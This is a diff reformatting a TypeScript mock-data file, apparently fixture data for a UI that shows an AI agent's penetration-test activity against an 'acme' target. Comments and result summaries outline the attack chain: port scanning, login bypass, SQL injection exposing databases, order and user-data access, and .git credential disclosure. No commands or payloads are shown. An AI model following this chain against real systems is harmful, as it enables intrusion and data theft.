     seq: 1006,
     worker: "planner",
     ts: T("2026-07-24T09:13:05Z"),
     kind: "text",
-    get summary() { return swt("interface.m2546"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2546");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // Round 1: expand attack surface (2026-07-25 14:12).
-  { seq: 1100, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", get summary() { return swt("interface.m2547"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+  {
+    seq: 1100,
+    worker: "planner",
+    ts: T("2026-07-25T14:12:00Z"),
+    kind: "round",
+    get summary() {
+      return swt("interface.m2547");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
   {
     seq: 1101,
     worker: "planner",
     ts: T("2026-07-25T14:12:15Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2548"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2548");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1102,
@@ -1504,10 +2165,18 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p1-nd",
-    get summary() { return swt("interface.m2549"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2550"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2549");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2550");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1103,
@@ -1516,10 +2185,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p1-nd",
-    get summary() { return swt("interface.m2551"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2552"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2551");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2552");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1104,
@@ -1528,10 +2205,18 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    get summary() { return swt("interface.m2553"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2554"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2553");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2554");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1105,
@@ -1540,16 +2225,24 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    get summary() { return swt("interface.m2555"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2555");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1106,
     worker: "planner",
     ts: T("2026-07-25T14:13:00Z"),
     kind: "text",
-    get summary() { return swt("interface.m2556"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2556");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // Round 2: foothold established, move internally (2026-07-25 20:25).
@@ -1558,16 +2251,24 @@ export const activity: Activity[] = [
     worker: "planner",
     ts: T("2026-07-25T20:25:00Z"),
     kind: "round",
-    get summary() { return swt("interface.m2557"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2557");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1201,
     worker: "planner",
     ts: T("2026-07-25T20:25:18Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2558"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2558");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1202,
@@ -1576,8 +2277,12 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    get summary() { return swt("interface.m2559"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2559");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1203,
@@ -1586,8 +2291,12 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    get summary() { return swt("interface.m2560"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2560");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1204,
@@ -1597,8 +2306,12 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p2-pg",
     summary: "prove_goal(g3, evidence=fa6)",
-    get detail() { return swt("interface.m2561"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2561");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1205,
@@ -1607,8 +2320,12 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p2-pg",
-    get summary() { return swt("interface.m2562"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2562");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1206,
@@ -1617,10 +2334,18 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p2-ai",
-    get summary() { return swt("interface.m2563"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2564"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2563");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2564");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1207,
@@ -1636,20 +2361,38 @@ export const activity: Activity[] = [
     worker: "planner",
     ts: T("2026-07-25T20:26:20Z"),
     kind: "text",
-    get summary() { return swt("interface.m2565"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2565");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // Round 3: target achievement review (2026-07-26 00:25).
-  { seq: 1300, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", get summary() { return swt("interface.m2566"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); } },
+  {
+    seq: 1300,
+    worker: "planner",
+    ts: T("2026-07-26T00:25:00Z"),
+    kind: "round",
+    get summary() {
+      return swt("interface.m2566");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+  },
   {
     seq: 1301,
     worker: "planner",
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2567"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2567");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1302,
@@ -1658,8 +2401,12 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "list_findings",
     tool_use_id: "p3-lf",
-    get summary() { return swt("interface.m2568"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2568");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1303,
@@ -1668,8 +2415,12 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "list_findings",
     tool_use_id: "p3-lf",
-    get summary() { return swt("interface.m2569"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2569");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1304,
@@ -1679,8 +2430,12 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p3-pg",
     summary: "prove_goal(g4, evidence=F-09)",
-    get detail() { return swt("interface.m2570"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2570");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1305,
@@ -1689,16 +2444,24 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p3-pg",
-    get summary() { return swt("interface.m2571"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2571");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1306,
     worker: "planner",
     ts: T("2026-07-26T00:26:10Z"),
     kind: "text",
-    get summary() { return swt("interface.m2572"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2572");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // Round 4: admin access achieved, focus g2 (2026-07-26 03:55).
@@ -1707,16 +2470,24 @@ export const activity: Activity[] = [
     worker: "planner",
     ts: T("2026-07-26T03:55:00Z"),
     kind: "round",
-    get summary() { return swt("interface.m2573"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2573");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1401,
     worker: "planner",
     ts: T("2026-07-26T03:55:14Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2574"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2574");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1402,
@@ -1726,8 +2497,12 @@ export const activity: Activity[] = [
     tool: "prove_goal",
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
-    get detail() { return swt("interface.m2575"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2575");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1403,
@@ -1736,16 +2511,24 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p4-pg",
-    get summary() { return swt("interface.m2576"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2576");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1404,
     worker: "planner",
     ts: T("2026-07-26T03:55:40Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2577"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2577");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1405,
@@ -1754,10 +2537,18 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    get summary() { return swt("interface.m2578"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2579"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2578");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2579");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1406,
@@ -1766,16 +2557,24 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    get summary() { return swt("interface.m2580"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2580");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 1407,
     worker: "planner",
     ts: T("2026-07-26T03:55:58Z"),
     kind: "text",
-    get summary() { return swt("interface.m2581"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2581");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // work#1, i1: subdomain enumeration and port scanning, done.
@@ -1785,8 +2584,12 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:20:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2582"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2582");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 11,
@@ -1806,10 +2609,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t11",
-    get summary() { return swt("interface.m2583"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2584"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2583");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2584");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 13,
@@ -1830,8 +2641,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12",
     summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
-    get detail() { return swt("interface.m2585"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2585");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 15,
@@ -1841,8 +2656,12 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "upsert_asset",
     tool_use_id: "t13",
-    get summary() { return swt("interface.m2586"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2586");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 16,
@@ -1860,8 +2679,12 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:40:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2587"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2587");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 96000,
     output_tokens: 6100,
     cache_read_tokens: 61000,
@@ -1875,8 +2698,12 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:31:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2588"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2588");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 21,
@@ -1897,8 +2724,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t21",
     summary: "401",
-    get detail() { return swt("interface.m2589"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2589");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 23,
@@ -1919,8 +2750,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t22",
     summary: "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard",
-    get detail() { return swt("interface.m2590"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2590");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 25,
@@ -1940,10 +2775,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t23",
-    get summary() { return swt("interface.m2591"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2592"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2591");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2592");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 27,
@@ -1963,8 +2806,12 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t24",
-    get summary() { return swt("interface.m2593"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2593");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 29,
@@ -1972,8 +2819,12 @@ export const activity: Activity[] = [
     intent_id: "i2",
     ts: T("2026-07-26T03:50:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2594"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2594");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 72000,
     output_tokens: 4800,
     cache_read_tokens: 48000,
@@ -1987,8 +2838,12 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-25T22:01:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2595"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2595");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 41,
@@ -2009,8 +2864,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t41",
     summary: "Unclosed quotation mark ... near '1'.",
-    get detail() { return swt("interface.m2596"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2596");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 43,
@@ -2032,8 +2891,12 @@ export const activity: Activity[] = [
     tool_use_id: "t42",
     summary:
       "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
-    get detail() { return swt("interface.m2597"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2597");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 45,
@@ -2053,8 +2916,12 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t43",
-    get summary() { return swt("interface.m2598"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2598");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 47,
@@ -2062,8 +2929,12 @@ export const activity: Activity[] = [
     intent_id: "i4",
     ts: T("2026-07-26T01:20:00Z"),
     kind: "result",
-    get summary() { return swt("interface.m2599"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2599");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
     input_tokens: 118000,
     output_tokens: 7400,
     cache_read_tokens: 82000,
@@ -2077,8 +2948,12 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T02:31:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2600"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2600");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 51,
@@ -2099,8 +2974,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t51",
     summary: '{ "order_id":1001, "user_id":42, "amount":299 }',
-    get detail() { return swt("interface.m2601"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2601");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 53,
@@ -2120,10 +2999,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "t52",
-    get summary() { return swt("interface.m2602"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
-    get detail() { return swt("interface.m2603"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2602");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
+    get detail() {
+      return swt("interface.m2603");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 55,
@@ -2143,8 +3030,12 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "report_finding",
     tool_use_id: "t53",
-    get summary() { return swt("interface.m2604"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2604");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 57,
@@ -2152,8 +3043,12 @@ export const activity: Activity[] = [
     intent_id: "i5",
     ts: T("2026-07-26T03:58:10Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2605"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2605");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // work#3, i3: admin-user endpoint enumeration, running.
@@ -2163,8 +3058,12 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:56:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2606"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2606");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 61,
@@ -2185,8 +3084,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t61",
     summary: '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
-    get detail() { return swt("interface.m2607"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2607");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 63,
@@ -2194,8 +3097,12 @@ export const activity: Activity[] = [
     intent_id: "i3",
     ts: T("2026-07-26T03:58:20Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2608"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2608");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
 
   // workG, ig: .git disclosure and hardcoded credentials, done.
@@ -2205,8 +3112,12 @@ export const activity: Activity[] = [
     intent_id: "ig",
     ts: T("2026-07-25T20:26:00Z"),
     kind: "thinking",
-    get summary() { return swt("interface.m2609"); },
-    set summary(value: string) { Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true }); },
+    get summary() {
+      return swt("interface.m2609");
+    },
+    set summary(value: string) {
+      Object.defineProperty(this, "summary", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 311,
@@ -2227,8 +3138,12 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "tg1",
     summary: "200",
-    get detail() { return swt("interface.m2610"); },
-    set detail(value: string) { Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true }); },
+    get detail() {
+      return swt("interface.m2610");
+    },
+    set detail(value: string) {
+      Object.defineProperty(this, "detail", { value, writable: true, enumerable: true, configurable: true });
+    },
   },
   {
     seq: 313,
@@ -2248,10 +3163,18 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "bash",
     tool_use_id: "tg2",
-    get summary() { return swt("interface.m2611"); },
